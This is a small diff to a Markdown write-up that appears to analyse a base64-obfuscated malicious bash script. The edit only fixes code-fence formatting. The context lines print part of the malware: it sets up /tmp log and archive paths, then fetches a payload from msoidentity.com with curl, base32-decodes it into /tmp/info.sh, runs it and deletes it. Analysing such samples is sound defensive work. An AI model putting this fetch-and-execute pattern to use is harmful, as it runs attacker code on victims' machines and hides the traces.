@@ -14,7 +14,7 @@ Here we go, this seems to be yet another bash script obfuscated in base64 being 
 
 ![image](https://github.com/user-attachments/assets/a6de7c73-fddb-4038-a09d-e87336d19171)
 
-`#!/bin/bash
+```#!/bin/bash
 
 $log="/tmp/log_$(date +"%Y-%m-%d--%H-%M")"
 $tgz="/tmp/log_$(date +"%Y-%m-%d--%H-%M").tgz"
@@ -57,4 +57,4 @@ if [ -f "$tarfile" ]; then
 curl -s https://msoidentity.com/info | base32 -d >> /tmp/info.sh
 /bin/bash /tmp/info.sh
 rm -f /tmp/info.sh
-`
+```
